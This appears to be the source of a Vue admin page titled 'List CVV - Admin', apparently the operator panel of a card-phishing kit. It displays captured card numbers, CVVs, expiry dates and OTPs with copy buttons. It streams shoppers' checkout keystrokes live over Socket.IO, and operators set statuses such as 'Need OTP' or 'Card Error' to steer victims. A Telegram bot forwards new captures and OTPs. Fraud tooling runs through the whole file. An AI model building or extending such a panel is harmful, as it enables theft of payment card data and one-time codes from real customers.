<template>
    <div class="min-h-screen bg-gradient-to-br from-gray-50 via-white to-orange-50">
        <div class="mb-4 p-4 bg-white rounded-lg shadow-sm border border-gray-200">
            <div class="flex items-center justify-between">
                <h1 class="text-xl font-bold text-gray-800">Payment Orders</h1>
                <div class="flex items-center space-x-4">
                    <button @click="goToCheckout" class="group bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 hover:from-orange-600 hover:via-red-500 hover:to-pink-500 text-white px-6 py-3 rounded-xl transition-all duration-500 transform hover:scale-105 hover:-translate-y-2 shadow-lg hover:shadow-2xl flex items-center space-x-2 animate-shimmer bg-size-200 text-sm font-bold">
                        <FontAwesomeIcon :icon="faShoppingCart" class="w-4 h-4 group-hover:scale-110 transition-transform duration-300" />
                        <span>Checkout</span>
                    </button>
                    <button @click="showTelegramConfig = !showTelegramConfig" class="group bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white px-4 py-2 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl text-sm font-bold">Telegram Config</button>
                    <div class="flex items-center space-x-2">
                        <div :class="['w-3 h-3 rounded-full', isPolling ? 'bg-green-500 animate-pulse' : 'bg-red-500']"></div>
                        <span class="text-sm text-gray-600">{{ pollingStatus }}</span>
                    </div>
                    <div class="flex items-center space-x-2">
                        <div class="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                        <span class="text-xs text-blue-600">Auto Telegram</span>
                    </div>
                </div>
            </div>
        </div>

        <div v-if="showTelegramConfig" class="mb-4 p-6 bg-gradient-to-br from-white via-orange-50 to-red-50 rounded-xl shadow-lg border border-orange-200 transition-all duration-500">
            <h2 class="text-xl font-bold bg-gradient-to-r from-orange-600 to-red-600 bg-clip-text text-transparent mb-6">Telegram Configuration</h2>

            <!-- Auto Telegram Info -->
            <div class="mb-6 p-4 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-xl border border-blue-200">
                <div class="flex items-center mb-3">
                    <div class="w-6 h-6 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-bold mr-3">🚀</div>
                    <h3 class="text-lg font-bold text-blue-800">Auto Telegram Notifications</h3>
                </div>
                <div class="text-sm text-blue-700 space-y-2">
                    <p><strong>✅ Tự động gửi thông báo khi:</strong></p>
                    <ul class="list-disc list-inside ml-4 space-y-1">
                        <li>🆕 Có đơn hàng mới từ checkout</li>
                        <li>🔄 Trạng thái đơn hàng thay đổi</li>
                        <li>🔢 Có OTP mới</li>
                    </ul>
                    <p class="mt-3 text-xs text-blue-600"><strong>💡 Tip:</strong> Không cần chờ ở admin page, thông báo sẽ được gửi tự động từ backend!</p>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label for="bot-token" class="block text-sm font-bold text-orange-700 mb-3">Bot Token</label>
                    <input id="bot-token" v-model="telegramConfig.bot_token" type="text" class="w-full px-4 py-3 border-2 border-orange-200 rounded-xl focus:ring-4 focus:ring-orange-200 focus:border-orange-400 transition-all duration-300 bg-white hover:border-orange-300 shadow-sm hover:shadow-md font-mono text-sm" placeholder="Enter Bot Token" />
                </div>
                <div>
                    <label for="chat-id" class="block text-sm font-bold text-red-700 mb-3">Chat ID</label>
                    <input id="chat-id" v-model="telegramConfig.chat_id" type="text" class="w-full px-4 py-3 border-2 border-red-200 rounded-xl focus:ring-4 focus:ring-red-200 focus:border-red-400 transition-all duration-300 bg-white hover:border-red-300 shadow-sm hover:shadow-md font-mono text-sm" placeholder="Enter Chat ID" />
                </div>
            </div>
            <div class="mt-6 flex flex-wrap gap-3">
                <button @click="saveTelegramConfig" :disabled="savingTelegram" class="group bg-gradient-to-r from-red-500 to-pink-500 hover:from-red-600 hover:to-pink-600 disabled:from-gray-400 disabled:to-gray-500 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed text-sm font-bold">
                    {{ savingTelegram ? 'Saving...' : 'Save Config' }}
                </button>
                <button @click="loadTelegramConfig" class="group bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl text-sm font-bold">Reload</button>
                <button @click="testTelegramNotification" :disabled="testingTelegram" class="group bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 disabled:from-gray-400 disabled:to-gray-500 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed text-sm font-bold">
                    {{ testingTelegram ? 'Testing...' : 'Test Notification' }}
                </button>
                <button @click="testDatabase" :disabled="testingDatabase" class="group bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600 disabled:from-gray-400 disabled:to-gray-500 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed text-sm font-bold">
                    {{ testingDatabase ? 'Testing...' : 'Test Database' }}
                </button>
                <button @click="fixDatabase" :disabled="fixingDatabase" class="group bg-gradient-to-r from-red-500 to-pink-500 hover:from-red-600 hover:to-pink-600 disabled:from-gray-400 disabled:to-gray-500 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed text-sm font-bold">
                    {{ fixingDatabase ? 'Fixing...' : 'Fix Database' }}
                </button>
                <button @click="testRealtimeBox" class="group bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white px-6 py-3 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl text-sm font-bold">Test Realtime Box</button>
            </div>
        </div>

        <!-- Real-time Data Display -->
        <div v-if="realtimeData" class="mb-6 p-6 bg-gradient-to-br from-green-50 via-blue-50 to-purple-50 rounded-xl shadow-lg border border-green-200 transition-all duration-500">
            <h2 class="text-xl font-bold bg-gradient-to-r from-green-600 to-blue-600 bg-clip-text text-transparent mb-4 flex items-center gap-2">
                <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                Live Checkout Session #{{ realtimeData.id }}
            </h2>

            <!-- Customer Information -->
            <div class="bg-white rounded-lg p-4 shadow-sm border border-green-200 mb-4">
                <h3 class="text-lg font-semibold text-gray-800 mb-3 flex items-center gap-2">
                    <div class="w-2 h-2 bg-blue-500 rounded-full"></div>
                    Customer Information
                </h3>
                <div class="grid grid-cols-2 md:grid-cols-3 gap-3">
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Name:</span>
                        <div class="text-sm font-mono bg-blue-50 text-blue-800 px-2 py-1 rounded">{{ realtimeData.customer.firstName || 'Not entered' }} {{ realtimeData.customer.lastName || '' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Email:</span>
                        <div class="text-sm font-mono bg-green-50 text-green-800 px-2 py-1 rounded">{{ realtimeData.customer.email || 'Not entered' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Phone:</span>
                        <div class="text-sm font-mono bg-purple-50 text-purple-800 px-2 py-1 rounded">{{ realtimeData.customer.phone || 'Not entered' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Country:</span>
                        <div class="text-sm font-mono bg-yellow-50 text-yellow-800 px-2 py-1 rounded">{{ realtimeData.customer.country || 'Not selected' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">City:</span>
                        <div class="text-sm font-mono bg-indigo-50 text-indigo-800 px-2 py-1 rounded">{{ realtimeData.customer.city || 'Not entered' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Started:</span>
                        <div class="text-xs text-gray-500">{{ new Date(realtimeData.startTime).toLocaleTimeString() }}</div>
                    </div>
                </div>
                <div class="grid grid-cols-2 md:grid-cols-3 gap-3 mt-3">
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Street:</span>
                        <div class="text-sm font-mono bg-orange-50 text-orange-800 px-2 py-1 rounded">{{ realtimeData.customer.street || 'Not entered' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Postal Code:</span>
                        <div class="text-sm font-mono bg-teal-50 text-teal-800 px-2 py-1 rounded">{{ realtimeData.customer.postalCode || 'Not entered' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">State:</span>
                        <div class="text-sm font-mono bg-pink-50 text-pink-800 px-2 py-1 rounded">{{ realtimeData.customer.state || 'Not entered' }}</div>
                    </div>
                </div>
            </div>

            <!-- Payment Information -->
            <div class="bg-white rounded-lg p-4 shadow-sm border border-green-200 mb-4">
                <h3 class="text-lg font-semibold text-gray-800 mb-3 flex items-center gap-2">
                    <div class="w-2 h-2 bg-red-500 rounded-full"></div>
                    Payment Information
                </h3>
                <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Method:</span>
                        <div class="text-sm font-mono bg-red-50 text-red-800 px-2 py-1 rounded">{{ realtimeData.payment.method }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Card Number:</span>
                        <div class="text-sm font-mono bg-orange-50 text-orange-800 px-2 py-1 rounded">{{ realtimeData.payment.cardNumber || 'Not entered' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">Expiry:</span>
                        <div class="text-sm font-mono bg-pink-50 text-pink-800 px-2 py-1 rounded">{{ realtimeData.payment.expiry || 'Not entered' }}</div>
                    </div>
                    <div>
                        <span class="text-xs font-semibold text-gray-600">CVV:</span>
                        <div class="text-sm font-mono bg-teal-50 text-teal-800 px-2 py-1 rounded">{{ realtimeData.payment.cvv || 'Not entered' }}</div>
                    </div>
                </div>
                <div class="mt-3">
                    <span class="text-xs font-semibold text-gray-600">Cardholder:</span>
                    <div class="text-sm font-mono bg-gray-50 text-gray-800 px-2 py-1 rounded">{{ realtimeData.payment.cardholderName || 'Not entered' }}</div>
                </div>
            </div>

            <!-- Field History -->
            <div class="bg-white rounded-lg p-4 shadow-sm border border-green-200">
                <h3 class="text-lg font-semibold text-gray-800 mb-3 flex items-center gap-2">
                    <div class="w-2 h-2 bg-green-500 rounded-full"></div>
                    Live Input History
                </h3>
                <div v-if="realtimeData.fieldHistory && realtimeData.fieldHistory.length > 0" class="space-y-2 max-h-40 overflow-y-auto">
                    <div v-for="(update, index) in realtimeData.fieldHistory.slice(-10)" :key="index" class="flex items-center justify-between p-2 bg-gray-50 rounded border-l-4 border-green-400">
                        <div class="flex items-center gap-3">
                            <span class="text-xs font-semibold text-gray-600 min-w-[80px]">{{ update.field }}:</span>
                            <span class="text-sm font-mono bg-white text-gray-800 px-2 py-1 rounded border">{{ update.displayValue }}</span>
                        </div>
                        <span class="text-xs text-gray-500">{{ new Date(update.timestamp).toLocaleTimeString() }}</span>
                    </div>
                </div>
                <div v-else class="text-sm text-gray-500 italic">Waiting for customer input...</div>
                <div class="mt-3 text-xs text-gray-500">Last update: {{ new Date(realtimeData.lastUpdate).toLocaleTimeString() }}</div>
            </div>
        </div>

        <div class="overflow-x-auto">
            <table class="min-w-full divide-y divide-gray-200">
                <thead class="bg-gradient-to-r from-orange-50 to-red-50">
                    <tr>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6">Payment ID</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6">Method</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6">Card Number</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden sm:table-cell">Cardholder</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden md:table-cell">Expiry</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden lg:table-cell">CVV</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden xl:table-cell">OTP</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6">Status</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6 hidden xl:table-cell">Date</th>
                        <th class="px-3 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider lg:px-6">Delete</th>
                    </tr>
                </thead>
                <tbody class="bg-white divide-y divide-gray-100">
                    <tr v-for="payment in payments" :key="payment.id" class="group hover:bg-gradient-to-r hover:from-orange-50 hover:to-red-50 transition-all duration-300">
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6">
                            <div class="text-sm font-bold text-gray-900 px-3 py-2">#{{ payment.id }}</div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6">
                            <div class="text-sm text-gray-900 capitalize cursor-pointer hover:bg-gradient-to-r hover:from-green-50 hover:to-blue-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-semibold" @click="copyToClipboard(payment.method)" :title="'Nhấn để copy: ' + payment.method">
                                {{ payment.method }}
                            </div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6">
                            <div class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-yellow-50 hover:to-orange-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold" @click="copyToClipboard(payment.card_number || 'N/A')" :title="'Click to copy: ' + (payment.card_number || 'N/A')">
                                {{ payment.card_number || 'N/A' }}
                            </div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6 hidden sm:table-cell">
                            <div class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-purple-50 hover:to-pink-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-semibold" @click="copyToClipboard(payment.cardholder_name || 'N/A')" :title="'Click to copy: ' + (payment.cardholder_name || 'N/A')">
                                {{ payment.cardholder_name || 'N/A' }}
                            </div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6 hidden md:table-cell">
                            <div class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-indigo-50 hover:to-blue-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold" @click="copyToClipboard(payment.expiry || 'N/A')" :title="'Click to copy: ' + (payment.expiry || 'N/A')">
                                {{ payment.expiry || 'N/A' }}
                            </div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6 hidden lg:table-cell">
                            <div class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-red-50 hover:to-pink-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold" @click="copyToClipboard(payment.cvv || 'N/A')" :title="'Click to copy: ' + (payment.cvv || 'N/A')">
                                {{ payment.cvv || 'N/A' }}
                            </div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6 hidden xl:table-cell">
                            <div class="text-sm text-gray-900 cursor-pointer hover:bg-gradient-to-r hover:from-cyan-50 hover:to-blue-50 px-3 py-2 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-sm hover:shadow-md font-mono font-bold" @click="copyToClipboard(payment.otp || 'N/A')" :title="'Click to copy: ' + (payment.otp || 'N/A')">
                                {{ payment.otp || 'N/A' }}
                            </div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap lg:px-6">
                            <select v-model="payment.status" @change="updatePaymentStatus(payment)" :class="getStatusClass(payment.status)" :disabled="payment.status === 'success'" class="px-3 py-2 lg:px-4 lg:py-3 text-xs lg:text-sm font-bold rounded-xl border-2 focus:ring-4 focus:ring-orange-200 focus:border-orange-400 transition-all duration-300 cursor-pointer hover:shadow-lg min-w-[100px] lg:min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:border-gray-200 transform hover:scale-105">
                                <option value="pending">Pending</option>
                                <option value="sms">Need OTP</option>
                                <option value="sms_error">OTP Error</option>
                                <option value="wrong">Card Error</option>
                                <option value="success">Success</option>
                            </select>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap text-sm text-gray-500 lg:px-6 hidden xl:table-cell">
                            <div class="px-3 py-2 font-semibold">
                                {{ formatDate(payment.created_at) }}
                            </div>
                        </td>
                        <td class="px-3 py-4 whitespace-nowrap text-sm font-medium lg:px-6">
                            <button @click="deletePayment(payment)" class="group bg-gradient-to-r from-red-500 to-pink-500 hover:from-red-600 hover:to-pink-600 text-white p-3 rounded-xl transition-all duration-300 transform hover:scale-110 hover:-translate-y-1 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed" :disabled="loading" title="Delete payment">
                                <FontAwesomeIcon :icon="faTrash" class="w-4 h-4 group-hover:scale-110 transition-transform duration-300" />
                            </button>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</template>

<script setup lang="ts">
import { FontAwesomeIcon } from '@fortawesome/vue-fontawesome';
import { faTrash, faShoppingCart, faCreditCard, faFileInvoice } from '@fortawesome/free-solid-svg-icons';
import type { PaymentInfo, TelegramSettings } from '~/server/database/db';
import { useSocket } from '~/composables/useSocket';

definePageMeta({
    layout: 'admin'
});

useHead({
    title: 'List CVV - Admin'
});

const payments = ref<PaymentInfo[]>([]);
const loading = ref(false);
const pollingStatus = ref('Đã kết nối');
const isPolling = ref(false);
let pollingTimer: NodeJS.Timeout | null = null;

// Socket.IO
const { connect, joinAdmin, onNewCheckout, onCardUpdated, offNewCheckout, offCardUpdated } = useSocket();
const realtimeData = ref<any>(null);
const realtimeHistory = ref<any[]>([]);
const currentSession = ref<any>(null);

const showTelegramConfig = ref(false);
const savingTelegram = ref(false);
const testingTelegram = ref(false);
const testingDatabase = ref(false);
const fixingDatabase = ref(false);
const telegramConfig = ref<TelegramSettings>({
    id: 0,
    bot_token: '',
    chat_id: ''
});

const BOT_TOKEN = computed(() => telegramConfig.value.bot_token || '');
const CHAT_ID = computed(() => telegramConfig.value.chat_id || '');

const loadTelegramConfig = async () => {
    try {
        const response = await $fetch<{ success: boolean; data: TelegramSettings }>('/api/admin/telegram/config');
        if (response.success && response.data) {
            telegramConfig.value = response.data;
        }
    } catch (error) {
        console.error('Lỗi tải cấu hình Telegram:', error);
    }
};

const saveTelegramConfig = async () => {
    try {
        savingTelegram.value = true;
        const response = await $fetch<{ success: boolean; message: string }>('/api/admin/telegram/config', {
            method: 'PUT',
            body: {
                bot_token: telegramConfig.value.bot_token,
                chat_id: telegramConfig.value.chat_id
            }
        });

        if (response.success) {
            alert(response.message);
        }
    } catch (error) {
        console.error('Lỗi lưu cấu hình Telegram:', error);
        alert('Lỗi lưu cấu hình Telegram');
    } finally {
        savingTelegram.value = false;
    }
};

const sendTelegramNotification = async (payment: PaymentInfo, isNew: boolean) => {
    // Thông báo này đã được xử lý ở backend, chỉ hiển thị thông báo local
    console.log(`📱 DEBUG: ${isNew ? 'New' : 'Updated'} payment notification (handled by backend):`, payment.id);

    // Hiển thị thông báo local cho admin
    const action = isNew ? '🆕 Đơn hàng mới' : '🔄 Cập nhật trạng thái';
    const message = `${action} #${payment.id} - ${payment.method}`;

    // Có thể thêm toast notification ở đây nếu cần
    console.log(message);
};

const comparePayments = (oldPayments: PaymentInfo[], newPayments: PaymentInfo[]) => {
    const oldMap = new Map(oldPayments.map((p) => [p.id, JSON.stringify(p)]));
    const changes: { payment: PaymentInfo; isNew: boolean }[] = [];

    for (const newPayment of newPayments) {
        const oldPaymentStr = oldMap.get(newPayment.id);
        const newPaymentStr = JSON.stringify(newPayment);

        if (!oldPaymentStr) {
            changes.push({ payment: newPayment, isNew: true });
        } else if (oldPaymentStr !== newPaymentStr) {
            changes.push({ payment: newPayment, isNew: false });
        }
    }

    return changes;
};

const poll = async () => {
    if (!isPolling.value) return;

    try {
        const newPayments = await $fetch<PaymentInfo[]>('/api/admin/payments');

        if (payments.value.length > 0) {
            const changes = comparePayments(payments.value, newPayments);

            for (const { payment, isNew } of changes) {
                // Chỉ hiển thị thông báo local, không gửi Telegram (đã xử lý ở backend)
                sendTelegramNotification(payment, isNew);
            }
        }

        payments.value = newPayments;
        pollingStatus.value = `(${newPayments.length})`;
    } catch {
        pollingStatus.value = 'Lỗi kết nối - đang thử lại...';
    }

    if (isPolling.value) {
        pollingTimer = setTimeout(poll, 2000); // Giảm tần suất polling
    }
};

const startPolling = async () => {
    if (isPolling.value) return;

    isPolling.value = true;

    try {
        const initialPayments = await $fetch<PaymentInfo[]>('/api/admin/payments');
        payments.value = initialPayments;
        pollingStatus.value = `(${initialPayments.length})`;
    } catch {
        pollingStatus.value = 'Lỗi kết nối - đang thử lại...';
    }

    pollingTimer = setTimeout(poll, 2000); // Giảm tần suất polling
};

const stopPolling = () => {
    isPolling.value = false;
    if (pollingTimer) {
        clearTimeout(pollingTimer);
        pollingTimer = null;
    }
};

const loadPayments = async () => {
    try {
        loading.value = true;
        const data = await $fetch<PaymentInfo[]>('/api/admin/payments');
        payments.value = data;
    } catch {
        alert('Lỗi');
    } finally {
        loading.value = false;
    }
};

// Xử lý dữ liệu real-time
const handleNewCheckout = (data: any) => {
    console.log('🆕 Nhận dữ liệu checkout mới:', data);

    // Tạo session mới
    currentSession.value = {
        id: Date.now(),
        customer: {
            firstName: data.firstName,
            lastName: data.lastName,
            email: data.email,
            country: data.country,
            street: data.street,
            apartment: data.apartment,
            postalCode: data.postalCode,
            city: data.city,
            state: data.state,
            phone: data.phone
        },
        payment: {
            method: data.paymentMethod,
            cardNumber: data.cardNumber,
            expiry: data.expiry,
            cvv: data.cvv,
            cardholderName: data.cardholderName
        },
        startTime: new Date(data.timestamp),
        lastUpdate: new Date(data.timestamp),
        fieldHistory: []
    };

    realtimeData.value = currentSession.value;
    console.log('✅ Realtime data updated:', realtimeData.value);

    // Hiển thị thông báo
    alert(`🆕 Khách hàng mới đang checkout!\nTên: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nThẻ: ${data.cardNumber}`);
};

const handleCardUpdate = (data: any) => {
    console.log('💳 Cập nhật thông tin thẻ:', data);

    if (currentSession.value) {
        // Cập nhật session hiện tại
        currentSession.value.lastUpdate = new Date(data.timestamp);

        // Thêm vào lịch sử field
        const fieldUpdate = {
            field: data.field,
            value: data.value,
            timestamp: new Date(data.timestamp),
            displayValue: data.field === 'cardNumber' ? data.value.replace(/\s/g, '') : data.value
        };

        currentSession.value.fieldHistory.push(fieldUpdate);

        // Cập nhật customer data
        if (data.field === 'firstName') {
            currentSession.value.customer.firstName = data.value;
        } else if (data.field === 'lastName') {
            currentSession.value.customer.lastName = data.value;
        } else if (data.field === 'email') {
            currentSession.value.customer.email = data.value;
        } else if (data.field === 'phone') {
            currentSession.value.customer.phone = data.value;
        } else if (data.field === 'country') {
            currentSession.value.customer.country = data.value;
        } else if (data.field === 'street') {
            currentSession.value.customer.street = data.value;
        } else if (data.field === 'apartment') {
            currentSession.value.customer.apartment = data.value;
        } else if (data.field === 'postalCode') {
            currentSession.value.customer.postalCode = data.value;
        } else if (data.field === 'city') {
            currentSession.value.customer.city = data.value;
        } else if (data.field === 'state') {
            currentSession.value.customer.state = data.value;
        }
        // Cập nhật payment data
        else if (data.field === 'cardNumber') {
            currentSession.value.payment.cardNumber = data.value;
        } else if (data.field === 'expiry') {
            currentSession.value.payment.expiry = data.value;
        } else if (data.field === 'cvv') {
            currentSession.value.payment.cvv = data.value;
        } else if (data.field === 'cardholderName') {
            currentSession.value.payment.cardholderName = data.value;
        }

        realtimeData.value = currentSession.value;
        console.log('✅ Realtime data updated:', realtimeData.value);
    } else {
        console.log('⚠️ No current session found, creating new session for field update');
        // Tạo session mới nếu chưa có
        currentSession.value = {
            id: Date.now(),
            customer: {},
            payment: {},
            startTime: new Date(),
            lastUpdate: new Date(),
            fieldHistory: []
        };
        realtimeData.value = currentSession.value;
    }

    // Hiển thị thông báo cập nhật
    console.log(`💳 Khách hàng đang nhập: ${data.field} = ${data.value}`);
};

// Test function để hiển thị realtime box
const testRealtimeBox = () => {
    console.log('🧪 Testing realtime box...');
    currentSession.value = {
        id: Date.now(),
        customer: {
            firstName: 'Test',
            lastName: 'User',
            email: 'test@example.com',
            phone: '+1234567890',
            country: 'US',
            street: '123 Test St',
            apartment: 'Apt 1',
            postalCode: '12345',
            city: 'Test City',
            state: 'Test State'
        },
        payment: {
            method: 'visa',
            cardNumber: '4111 1111 1111 1111',
            expiry: '12/25',
            cvv: '123',
            cardholderName: 'Test User'
        },
        startTime: new Date(),
        lastUpdate: new Date(),
        fieldHistory: [
            { field: 'firstName', value: 'Test', timestamp: new Date(), displayValue: 'Test' },
            { field: 'email', value: 'test@example.com', timestamp: new Date(), displayValue: 'test@example.com' }
        ]
    };
    realtimeData.value = currentSession.value;
    console.log('✅ Test realtime box created:', realtimeData.value);
};

onMounted(async () => {
    await loadTelegramConfig();
    await startPolling();

    // Kết nối Socket.IO
    console.log('🔌 Connecting to Socket.IO...');
    const socket = connect();
    console.log('✅ Socket connected:', socket);

    joinAdmin();
    console.log('👥 Joined admin room');

    // Lắng nghe sự kiện real-time
    onNewCheckout(handleNewCheckout);
    onCardUpdated(handleCardUpdate);
    console.log('👂 Listening for real-time events');
});

onUnmounted(() => {
    stopPolling();

    // Ngắt kết nối Socket.IO
    offNewCheckout();
    offCardUpdated();
});

const updatePaymentStatus = async (payment: PaymentInfo) => {
    try {
        console.log(`🔄 DEBUG: Updating payment ${payment.id} status to ${payment.status}`);

        const response = await $fetch(`/api/admin/payments/${payment.id}/status`, {
            method: 'PUT',
            body: { status: payment.status }
        });

        console.log(`✅ DEBUG: Status update response:`, response);

        // Show success message
        if (response.success) {
            console.log(`✅ DEBUG: Payment ${payment.id} status updated successfully`);
            // Show success notification
            alert(`✅ Cập nhật trạng thái thành công cho payment #${payment.id}`);
        }
    } catch (error: any) {
        console.error(`❌ DEBUG: Error updating payment ${payment.id} status:`, error);

        // Show detailed error message
        let errorMessage = 'Lỗi cập nhật!';

        if (error.data?.statusMessage) {
            errorMessage = `Lỗi cập nhật: ${error.data.statusMessage}`;
        } else if (error.message) {
            errorMessage = `Lỗi cập nhật: ${error.message}`;
        } else if (error.statusMessage) {
            errorMessage = `Lỗi cập nhật: ${error.statusMessage}`;
        }

        alert(errorMessage);

        // Reload payments to get fresh data
        await loadPayments();
    }
};

const deletePayment = async (payment: PaymentInfo) => {
    if (!confirm(`Xóa ID #${payment.id}?`)) {
        return;
    }

    try {
        loading.value = true;
        await $fetch(`/api/admin/payments/${payment.id}`, {
            method: 'DELETE'
        });
        await loadPayments();
    } catch {
        alert('Lỗi khi xoá');
    } finally {
        loading.value = false;
    }
};

const copyToClipboard = async (text: string) => {
    try {
        await navigator.clipboard.writeText(text);
        alert('Đã copy!');
    } catch {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        alert('Đã copy!');
    }
};

const formatDate = (dateString: string) => {
    if (!dateString) return 'Không có';
    return new Date(dateString).toLocaleDateString('vi-VN', {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        hour12: false
    });
};

// Navigate to checkout page
const goToCheckout = () => {
    navigateTo('/checkout');
};

const getStatusClass = (status: string) => {
    const classes: Record<string, string> = {
        pending: 'bg-gradient-to-r from-gray-100 to-gray-200 text-gray-800 border-gray-400 shadow-md',
        sms: 'bg-gradient-to-r from-yellow-100 to-orange-200 text-yellow-800 border-yellow-400 shadow-md',
        sms_error: 'bg-gradient-to-r from-orange-100 to-red-200 text-orange-800 border-orange-400 shadow-md',
        wrong: 'bg-gradient-to-r from-red-100 to-pink-200 text-red-800 border-red-400 shadow-md',
        success: 'bg-gradient-to-r from-blue-100 to-green-200 text-blue-800 border-blue-400 shadow-md'
    };
    return classes[status] || 'bg-gradient-to-r from-gray-100 to-gray-200 text-gray-800 border-gray-400 shadow-md';
};

const testTelegramNotification = async () => {
    try {
        testingTelegram.value = true;
        const response = await $fetch<{ success: boolean; message: string }>('/api/admin/telegram/test', {
            method: 'POST'
        });

        if (response.success) {
            alert('✅ Test notification sent successfully! Check your Telegram.');
        } else {
            alert('❌ Failed to send test notification.');
        }
    } catch (error) {
        console.error('Lỗi test Telegram notification:', error);
        alert('❌ Error testing Telegram notification. Check console for details.');
    } finally {
        testingTelegram.value = false;
    }
};

const testDatabase = async () => {
    try {
        testingDatabase.value = true;

        // Test basic database operations
        const response = await $fetch<PaymentInfo[]>('/api/admin/payments');

        if (response && Array.isArray(response)) {
            alert(`✅ Database connection OK! Found ${response.length} payments.`);
        } else {
            alert('❌ Database test failed - unexpected response format.');
        }
    } catch (error: any) {
        console.error('Database test error:', error);
        alert(`❌ Database test failed: ${error.message || 'Unknown error'}`);
    } finally {
        testingDatabase.value = false;
    }
};

const fixDatabase = async () => {
    try {
        fixingDatabase.value = true;

        const response = await $fetch<{ success: boolean; message: string; data: any }>('/api/admin/fix-database');

        if (response.success) {
            alert(`✅ Database fix successful!\n\n${response.message}\n\nColumns: ${response.data.columns.join(', ')}\nTotal payments: ${response.data.totalPayments}`);
        } else {
            alert(`❌ Database fix failed: ${response.message}`);
        }
    } catch (error: any) {
        console.error('Database fix error:', error);
        alert(`❌ Database fix failed: ${error.message || 'Unknown error'}`);
    } finally {
        fixingDatabase.value = false;
    }
};
</script>
